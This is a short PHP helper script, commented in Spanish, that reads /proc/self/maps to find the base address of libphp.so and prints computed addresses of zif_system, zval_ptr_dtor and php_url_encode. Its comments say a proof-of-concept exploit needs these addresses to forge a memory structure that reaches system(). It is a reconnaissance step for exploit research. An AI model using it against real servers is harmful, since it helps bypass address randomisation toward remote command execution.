<?php
/**
 * base.php — determina la direccion base de libphp.so en runtime.
 *
 * El PoC necesita offsets ABSOLUTOS (zif_system, zval_ptr_dtor) para forjar
 * la estructura. Si ASLR esta off, la base es fija y los offsets del binario
 * sirven directamente. Si ASLR esta on, la base cambia en cada arranque y el
 * PoC necesita una fuga previa.
 *
 * Este script NO es un exploit: solo lee /proc/self/maps.
 */
$base = null;
$size = 0;
foreach (file('/proc/self/maps') as $line) {
    if (strpos($line, 'libphp.so') !== false) {
        $parts = preg_split('/\s+/', trim($line));
        if (count($parts) < 5) continue;
        list($range, $perms, $offset) = $parts;
        if ($perms[0] !== 'r' || $perms[2] !== 'x') continue;
        list($lo, $hi) = explode('-', $range);
        $lo = hexdec($lo);
        $hi = hexdec($hi);
        if ($base === null) { $base = $lo; $size = $hi - $lo; }
    }
}
if ($base === null) {
    echo "BASE=NOT_FOUND\n";
} else {
    echo "BASE=0x", dechex($base), "\n";
    echo "SIZE=0x", dechex($size), "\n";
    // offsets extraidos del binario con simbolos
    echo "ZIF_SYSTEM=0x", dechex($base + 0x4079b0), "\n";
    echo "ZVAL_PTR_DTOR=0x", dechex($base + 0x4d3ad0), "\n";
    echo "PHP_URL_ENCODE=0x", dechex($base + 0x341e50), "\n";
}
echo "PID=", getmypid(), "\n";
echo "SAPI=", php_sapi_name(), "\n";
